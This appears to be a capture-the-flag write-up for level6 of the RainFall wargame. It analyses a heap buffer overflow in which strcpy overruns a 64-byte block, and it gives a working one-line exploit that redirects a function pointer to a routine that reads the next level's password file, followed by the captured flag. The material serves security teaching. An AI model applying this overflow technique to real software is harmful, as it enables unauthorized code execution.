## Step 1: Static & Dynamic Analysis

```c
int32_t m()
{
    return puts("Nope");
}

int32_t n()
{
    return system("/bin/cat /home/user/level7/.pass");
}

int32_t main(int32_t argc, char** argv, char** envp)
{
    char* eax = malloc(64);
    int32_t (** eax_1)() = malloc(4);
    *eax_1 = m;
    strcpy(eax, argv[1]);
    return (*eax_1)();
}
```

### Explanation

The binary allocates two memory blocks on the `heap`, the first one is `64` bytes, and the second is `4` bytes. The second block stores a function pointer initialized to `m()`. 

Then, the binary uses `strcpy()` to copy `argv[1]` into the first block without any check about `buffer overflow`. Our goal is to overflow the first block and overwrite the function pointer from `m()` to `n()`.

```asm
(gdb) info proc map
process 5857
Mapped address spaces:
        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/user/level6/level6
         0x8049000  0x804a000     0x1000        0x0 /home/user/level6/level6
         0x804a000  0x806b000    0x21000        0x0 [heap]
        0xb7e2b000 0xb7e2c000     0x1000        0x0 
        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd2000 0xb7fd5000     0x3000        0x0 
        0xb7fdb000 0xb7fdd000     0x2000        0x0 
        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
```

We inspect the heap contents after filling our buffer with 64 bytes.

```asm
(gdb) run $(python -c 'print("A" * 64)')

(gdb) x/32wx 0x804a000
    0x804a000:      0x00000000      0x00000049      0x41414141      0x41414141
    0x804a010:      0x41414141      0x41414141      0x41414141      0x41414141
    0x804a020:      0x41414141      0x41414141      0x41414141      0x41414141
    0x804a030:      0x41414141      0x41414141      0x41414141      0x41414141
    0x804a040:      0x41414141      0x41414141      0x00000000      0x00000011
    0x804a050:      0x08048468      0x00000000      0x00000000      0x00020fa9
    0x804a060:      0x00000000      0x00000000      0x00000000      0x00000000
    0x804a070:      0x00000000      0x00000000      0x00000000      0x00000000
```

```asm
(gdb) disas m
Dump of assembler code for function m:
   0x08048468 <+0>:     push   %ebp
   0x08048469 <+1>:     mov    %esp,%ebp
   0x0804846b <+3>:     sub    $0x18,%esp
   0x0804846e <+6>:     movl   $0x80485d1,(%esp)
   0x08048475 <+13>:    call   0x8048360 <puts@plt>
   0x0804847a <+18>:    leave  
   0x0804847b <+19>:    ret    
```

The address of `m()` is located at `0x08048468`, just 72 bytes from the start of the first block. We will overwrite this address with the address of `n()`.

```asm
(gdb) disas n
Dump of assembler code for function n:
   0x08048454 <+0>:     push   %ebp
   0x08048455 <+1>:     mov    %esp,%ebp
   0x08048457 <+3>:     sub    $0x18,%esp
   0x0804845a <+6>:     movl   $0x80485b0,(%esp)
   0x08048461 <+13>:    call   0x8048370 <system@plt>
   0x08048466 <+18>:    leave  
   0x08048467 <+19>:    ret
```

## Step 2: Exploit the Binary

```bash
level6@RainFall:~$ ./level6 $(python -c 'print("A" * 72 + "\x08\x04\x84\x54"[::-1])')

f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
